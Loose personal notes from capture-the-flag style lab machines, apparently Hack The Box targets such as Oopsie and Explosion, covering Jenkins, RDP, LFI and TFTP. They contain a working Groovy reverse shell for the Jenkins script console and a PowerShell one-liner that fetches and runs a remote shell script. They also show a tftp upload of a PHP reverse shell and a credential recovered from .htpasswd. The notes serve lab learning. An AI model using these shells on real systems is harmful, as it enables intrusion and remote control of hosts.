
* What does versions of software mean?   

    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Semver.jpg/440px-Semver.jpg">  


* Groovy Script   
Groovy is a scripting language with Java-like syntax for the Java platform




* Exploiting the ability to execute arbitrary groovy script in script console in jenkins admin page:

```groovy
String host="10.10.15.82";
int port=1234;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```





dir /a:h /b /s

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.189 3001


* Oopsie  

* Why I got stuck? 
  * I didn't think of changing the id in the url I kept trying to guess the Access ID when in reality I could access it by decreasing the id in the url when I'm viewing the access ID of the guest user. 





* Banner Grab  

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

* So the problem was with the certificate. When I use `xfreerdp /v:[IP ADDRESS] /cert:ignore /u:Administrator`. 
* First off, we use Administrator instead of root in Windows machines.
* Second, I should've looked more into the flags or switches or whatever they call them. Anyway, it wouldn't have occured to me that I have to ignore the cert or that this was an option or that if I put it it will be functional.

```
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[03:25:50:883] [2009:2010] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - CN = Explosion

```



* The local file inclusion vul in the http service allowed me to access the `.htpasswd` file which, it seems, contains usernames and password. Indeed, it did contain the username and password of a user named Mike. I'll try and ssh with them. Damn just remembered there's no ssh on the host.
mike:Sheffield19


tftp 10.129.132.172 -m binary -c put revShell.php revShell.php

* It seems like I will be making a container so that I can open it with root privilege.  

[[Linux]]
	
	
	









